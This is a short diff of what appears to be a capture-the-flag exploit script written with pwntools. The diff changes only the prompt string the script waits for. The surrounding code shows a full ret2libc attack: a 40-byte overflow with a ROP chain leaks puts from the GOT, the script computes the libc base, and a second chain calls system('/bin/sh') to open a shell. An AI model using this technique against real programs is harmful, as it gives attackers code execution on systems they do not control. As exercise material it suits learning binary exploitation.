@@ -27,7 +27,7 @@ rop = ROP(e)
 rop.puts(puts_got)
 rop.learn()
 
-p.sendlineafter('[Y/N]', b'a' * 40 + rop.chain())
+p.sendlineafter('[y/N]', b'a' * 40 + rop.chain())
 
 p.recvuntil('!\n\n')
 libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off
@@ -40,7 +40,7 @@ libc.address = libc_off
 rop = ROP(libc)
 rop.system(libc_off + binsh_off)
 
-p.sendlineafter('[Y/N]', b'a' * 40 + rop.chain())
+p.sendlineafter('[y/N]', b'a' * 40 + rop.chain())
 
 #pray for flag
 
